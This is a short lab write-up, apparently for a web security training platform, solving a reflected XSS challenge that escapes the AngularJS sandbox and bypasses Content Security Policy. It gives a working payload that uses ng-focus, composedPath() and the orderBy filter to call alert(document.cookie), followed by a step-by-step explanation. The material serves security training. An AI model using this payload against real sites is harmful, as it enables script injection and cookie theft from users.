# Lab 13: Reflected XSS with AngularJS sandbox escape and CSP

This lab uses **Content Security Policy (CSP)** alongside **AngularJS**.

---

## ❗ Lab Challenge

Perform a cross-site scripting attack that:

- **Bypasses CSP**
- **Escapes the AngularJS sandbox**
- Calls `alert(document.cookie)`

---

## 🔧 Solution

1. Visit the **exploit server** for the lab.
2. Paste the following code, replacing `YOUR-LAB-ID` with your lab ID:

```html
<script>
location='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>

```

1. Click **Store** and then **Deliver exploit to victim**.

---

## 💡 Explanation

- The exploit uses AngularJS’s **`ng-focus`** event to create a focus event that **bypasses CSP restrictions**.
- `$event` is an AngularJS variable referencing the **event object**.
- The **`composedPath()`** method (Chrome-specific) returns an array of elements that triggered the event. The last element is the **window object**.
- In AngularJS, `|` denotes a **filter operation** (not a bitwise OR as in vanilla JavaScript).
- The filter used here is **`orderBy`**, which takes an argument after the colon.
- Instead of calling `alert` directly, it’s assigned to the variable `z` inside the argument `(z=alert)(document.cookie)`.
- The `alert` function executes when the `orderBy` filter reaches the window object in the event path array.
- This allows code execution in the window context **without explicitly referencing `window`**, bypassing AngularJS’s window whitelist checks.

---

## ▶️ Community Video Solution

> Watch a detailed walkthrough here:
[https://youtu.be/ezCHiuFRTMA](https://youtu.be/ezCHiuFRTMA)
>